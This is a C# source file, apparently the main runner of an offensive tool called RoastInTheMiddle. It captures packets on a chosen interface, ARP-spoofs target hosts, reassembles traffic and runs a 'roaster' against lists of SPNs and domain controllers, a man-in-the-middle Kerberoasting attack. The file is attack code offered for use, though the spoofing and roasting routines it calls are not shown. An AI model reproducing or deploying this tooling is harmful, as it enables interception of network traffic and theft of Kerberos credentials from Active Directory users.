using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Threading;
using System.Net;
using System.Net.NetworkInformation;
using SharpPcap;

namespace RoastInTheMiddle.Lib
{
    public class RitM
    {
        public static async Task Run(string listenIP,
            List<IPAddress> targets,
            List<IPAddress> dcIPs,
            List<string> spns)
        {
            var tasks = new List<Task>();
            Program.shared["captured"] = null;
            Program.shared["spns"] = spns;
            Program.shared["dcs"] = dcIPs;
            Program.shared["capture_device"] = null;
            Program.shared["spoof"] = false;
            Program.shared["targets"] = targets;
            Program.shared["resolved"] = new Dictionary<IPAddress, PhysicalAddress>();
            Program.shared["reassemble"] = new Dictionary<string, SortedDictionary<uint, PacketDotNet.EthernetPacket>>();

            if (!SetCaptureDevice(listenIP))
            {
                Console.WriteLine($"[X] Unable to capture on device with IP {listenIP}");
                return;
            }

            Console.WriteLine($"[*] Loaded {spns.Count} SPNs to try");

            Console.WriteLine("[*] Starting sniffer");
            var sniffer = Task.Run(() => Sniffer.Start(listenIP));
            tasks.Add(sniffer);

            Console.WriteLine("[*] Starting reassembler");
            var reassembler = Task.Run(() => Reassembler.Reassemble());
            tasks.Add(reassembler);

            if (targets != null)
            {
                Thread.Sleep(100);
                Console.WriteLine("[*] Starting ARP spoofer");
                var spoofer = Task.Run(() => Spoofer.Start(targets));
                tasks.Add(spoofer);
            }

            Console.WriteLine("[*] Starting roaster");
            var roaster = Task.Run(() => Roaster.RitMRoaster());
            tasks.Add(roaster);

            await Task.WhenAll(tasks);
        }

        private static bool SetCaptureDevice(string listenIP)
        {
            var devices = CaptureDeviceList.Instance;
            foreach (var dev in devices)
            {
                var devInfoParts = dev.ToString().Split('\n');
                foreach (var infoPart in devInfoParts)
                {
                    if (infoPart.StartsWith("Addr:"))
                    {
                        if (infoPart.Contains(listenIP))
                        {
                            Program.shared["capture_device"] = dev;
                        }
                    }
                }
            }

            return Program.shared["capture_device"] != null;
        }
    }
}
